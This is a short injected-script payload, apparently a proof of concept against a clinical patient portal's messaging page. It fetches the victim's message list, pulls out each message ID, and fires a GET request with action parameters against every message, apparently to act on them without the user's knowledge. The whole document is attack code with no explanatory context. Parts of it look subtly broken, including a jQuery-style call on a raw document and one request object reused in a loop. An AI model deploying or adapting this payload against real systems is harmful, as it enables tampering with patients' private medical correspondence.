<script>
var req = new XMLHttpRequest();
var req2 = new XMLHttpRequest();

req.onreadystatechange = function()
{
if (req.readyState == 4 && req.status == 200 )
  {
  var htmlPage = req.responseXML;
  var myStringArray = htmlPage.$('tbody tr[id]').map(function() {
  return this.id;
      });
  var arrayLength = myStringArray.length;
  for (var i = 0; i < arrayLength; i++) {
    console.log(myStringArray[i]);
     req2.open("GET", "https://appsecpatientportal.eclinicalweb.com/portal_trunk/jsp/jspnew/messages.jsp?box=2&nact=1&msgid="+myStringArray[i], true);
     req2.send();
      }
   }
};

req.open("GET", "https://appsecpatientportal.eclinicalweb.com/portal_trunk/jsp/jspnew/messages.jsp");
req.responseType = "document";
req.send();

</script>
